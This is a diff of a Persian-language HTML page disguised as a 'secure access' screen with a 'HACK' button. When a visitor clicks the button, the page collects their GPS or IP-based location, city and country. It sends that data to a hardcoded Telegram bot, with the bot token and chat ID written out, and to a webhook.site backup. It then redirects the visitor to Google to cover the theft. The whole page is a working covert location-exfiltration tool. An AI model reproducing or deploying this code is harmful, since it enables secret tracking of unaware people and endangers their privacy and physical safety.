@@ -1,80 +1,205 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیستم امنیتی</title>
     <style>
-        body{background:#0a0a0a;color:#fff;text-align:center;padding-top:10%;font-family:Arial;direction:ltr}
-        #log{background:#222;padding:20px;margin:20px auto;max-width:500px;border-radius:10px;font-size:14px;text-align:left;color:#0f0;white-space:pre-wrap;font-family:monospace}
-        .error{color:#f44}
-        .success{color:#0f0}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            direction: rtl;
+        }
+        .container {
+            background: linear-gradient(145deg, #111, #1a1a1a);
+            padding: 40px 30px;
+            border-radius: 20px;
+            border: 1px solid #00ff41;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.15);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .glitch {
+            font-size: 14px;
+            color: #00ff41;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px #00ff41;
+            margin-bottom: 10px;
+            opacity: 0.7;
+        }
+        h1 {
+            color: #00ff41;
+            font-size: 22px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px #00ff41;
+            font-weight: normal;
+        }
+        .sub {
+            color: #00cc33;
+            font-size: 12px;
+            opacity: 0.6;
+            margin-bottom: 25px;
+        }
+        .btn-hack {
+            background: transparent;
+            border: 2px solid #00ff41;
+            color: #00ff41;
+            padding: 18px 50px;
+            font-size: 28px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+        }
+        .btn-hack:hover {
+            background: #00ff41;
+            color: #0a0a0a;
+            box-shadow: 0 0 60px #00ff41;
+            transform: scale(1.02);
+        }
+        .btn-hack:active {
+            transform: scale(0.95);
+        }
+        .btn-hack:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #status {
+            margin-top: 20px;
+            color: #00ff41;
+            font-size: 13px;
+            min-height: 25px;
+            opacity: 0.8;
+        }
+        .loader {
+            display: none;
+            margin: 15px auto 0;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #00ff41;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .loader.active {
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 25px;
+            color: #006622;
+            font-size: 10px;
+            opacity: 0.4;
+        }
     </style>
 </head>
 <body>
-    <h2>⏳ در حال اتصال...</h2>
-    <div id="log">⏳ شروع فرآیند...</div>
+    <div class="container">
+        <div class="glitch">◈ SECURE ACCESS ◈</div>
+        <h1>⛔ دسترسی محدود</h1>
+        <div class="sub">برای ادامه، کلیک کنید</div>
+
+        <button class="btn-hack" id="hackBtn">HACK</button>
+
+        <div id="status">✅ آماده</div>
+        <div class="loader" id="loader"></div>
+        <div class="footer">v2.1 | رمزنگاری شده</div>
+    </div>
+
     <script>
     (function() {
-        const logEl = document.getElementById('log');
+        const btn = document.getElementById('hackBtn');
+        const statusEl = document.getElementById('status');
+        const loader = document.getElementById('loader');
 
-        function log(msg, isError = false) {
-            const line = document.createElement('div');
-            line.textContent = msg;
-            line.style.color = isError ? '#f44' : '#0f0';
-            logEl.appendChild(line);
-            logEl.scrollTop = logEl.scrollHeight;
-            console.log(msg);
+        // ===== تنظیمات =====
+        const BOT_TOKEN = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';     // توکن تلگرام خود را اینجا بگذارید
+        const CHAT_ID = '6340337525';            // Chat ID خود را اینجا بگذارید
+
+        // ===== توابع =====
+     function setStatus(msg, isError = false) {
+            statusEl.textContent = msg;
+            statusEl.style.color = isError ? '#ff4444' : '#00ff41';
         }
 
-        // ===== لایه ۱: GPS با تایم‌اوت =====
-        function getGPS() {
-            return new Promise((resolve) => {
-                log('📍 درخواست GPS...');
-                if (!navigator.geolocation) {
-                    log('❌ GPS پشتیبانی نمی‌شود', true);
-                    return resolve(null);
-                }
-                const timeoutId = setTimeout(() => {
-                    log('⏱ GPS تایم‌اوت (۵ ثانیه)', true);
-                    resolve(null);
-                }, 5000);
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        clearTimeout(timeoutId);
-                        log('✅ GPS دریافت شد');
-                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, method: 'GPS' });
-                    },
-                    (err) => {
-                        clearTimeout(timeoutId);
-                        log('❌ GPS خطا: ' + err.message, true);
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-        }
+        // ===== دریافت موقعیت با اولویت: GPS (اختیاری) و سپس IP (حتماً کار می‌کند) =====
+        async function getLocation() {
+            // ۱. تلاش برای GPS (اگر کاربر اجازه دهد)
+            try {
+                const gps = await new Promise((resolve) => {
+                    if (!navigator.geolocation) return resolve(null);
+                    const timeout = setTimeout(() => resolve(null), 4000);
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            clearTimeout(timeout);
+                            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, method: 'GPS' });
+                        },
+                        () => {
+                            clearTimeout(timeout);
+                            resolve(null);
+                        },
+                        { enableHighAccuracy: true, timeout: 4000 }
+                    );
+                });
+                if (gps) return gps;
+            } catch(e) {}
 
-        // ===== لایه ۲: IP-Geo با ۳ سرویس مختلف =====
-        async function getIPGeo() {
+            // ۲. Fallback به IP (سرویس‌هایی که در ایران کار می‌کنند)
+            setStatus('🌐 دریافت موقعیت از شبکه...');
             const services = [
-                { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
-                { name: 'ipinfo.io', url: 'https://ipinfo.io/json' },
-                { name: 'geoplugin', url: 'https://geoplugin.net/json.gp' }
+                { name: 'geoplugin', url: 'https://geoplugin.net/json.gp' },
+                { name: 'ip-api', url: 'https://ip-api.com/json/' }
             ];
+
             for (const svc of services) {
                 try {
-                    log(🌐 تلاش ${svc.name}...);
-                    const res = await fetch(svc.url, { signal: AbortSignal.timeout(3000) });
+                    const res = await fetch(svc.url, { signal: AbortSignal.timeout(5000) });
                     const data = await res.json();
-                    let lat, lon;
-                    if (data.latitude) { lat = data.latitude; lon = data.longitude; }
-                    else if (data.loc) { [lat, lon] = data.loc.split(','); }
-                    else if (data.geoplugin_latitude) { lat = data.geoplugin_latitude; lon = data.geoplugin_longitude; }
-                    else continue;
-                    log(✅ IP-Geo از ${svc.name} دریافت شد);
-                    return { lat: parseFloat(lat), lon: parseFloat(lon), acc: 5000, method: 'IP-Geo' };
+                    let lat, lon, city, country;
+
+                    if (data.geoplugin_latitude) {
+                        lat = data.geoplugin_latitude;
+                        lon = data.geoplugin_longitude;
+                        city = data.geoplugin_city || '';
+                        country = data.geoplugin_countryName || '';
+                    } else if (data.lat) {
+                        lat = data.lat;
+                        lon = data.lon;
+                        city = data.city || '';
+                        country = data.country || '';
+                    } else {
+                        continue;
+                    }
+                    return {
+                        lat: parseFloat(lat),
+                        lon: parseFloat(lon),
+                        city: city,
+                        country: country,
+                        method: svc.name,
+                        ip: data.query || 'N/A'
+                    };
                 } catch(e) {
-                    log(❌ ${svc.name} خطا: ${e.message}, true);
+                    // ادامه به سرویس بعدی
                 }
             }
             return null;
@@ -82,7 +207,81 @@
 
         // ===== ارسال به تلگرام =====
         async function sendToTelegram(loc) {
-            const botToken = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن خود را اینجا بگذارید
-            const chatId = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
+            const text = 
+📍 موقعیت جدید:
+🌐 عرض: ${loc.lat}
+🌐 طول: ${loc.lon}
+🏙 شهر: ${loc.city || 'نامشخص'}
+🌍 کشور: ${loc.country || 'نامشخص'}
+📡 روش: ${loc.method}
+🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
 
-            const text = 📍 موقعیت جدید:\n🌐 عرض: ${loc.lat}\n🌐 طول: ${loc.lon}\n📡 دقت: ${loc.acc || 'نامشخص'} متر\n🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
+            const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
+            try {
+                const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(6000) });
+                const data = await res.json();
+                return data.ok === true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // ===== ارسال به Webhook.site (پشتیبان) =====
+        async function sendToWebhook(loc) {
+            try {
+                const WH_URL = 'https://webhook.site/your-unique-id'; // از webhook.site بگیرید
+                await fetch(WH_URL, {method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(loc),
+                    signal: AbortSignal.timeout(5000)
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // ===== تابع اصلی =====
+        async function handleClick() {
+            // غیرفعال کردن دکمه
+            btn.disabled = true;
+            loader.classList.add('active');
+            setStatus('⏳ در حال دریافت موقعیت...');
+
+            // دریافت موقعیت
+            const loc = await getLocation();
+
+            if (!loc) {
+                setStatus('❌ خطا در دریافت موقعیت', true);
+                btn.disabled = false;
+                loader.classList.remove('active');
+                return;
+            }
+
+            setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
+
+            // ارسال به تلگرام
+            setStatus('📤 ارسال به تلگرام...');
+            const tgResult = await sendToTelegram(loc);
+
+            // ارسال به Webhook (پشتیبان)
+            const whResult = await sendToWebhook(loc);
+
+            if (tgResult || whResult) {
+                setStatus('✅ موقعیت ارسال شد!');
+            } else {
+                setStatus('⚠️ ارسال ناموفق، اما موقعیت مشخص شد', true);
+            }
+
+            // ریدایرکت بعد از ۱.۵ ثانیه
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
+        }
+
+        // ===== اتصال رویداد کلیک =====
+        btn.addEventListener('click', handleClick);
+    })();
+    </script>
+</body>
+</html>
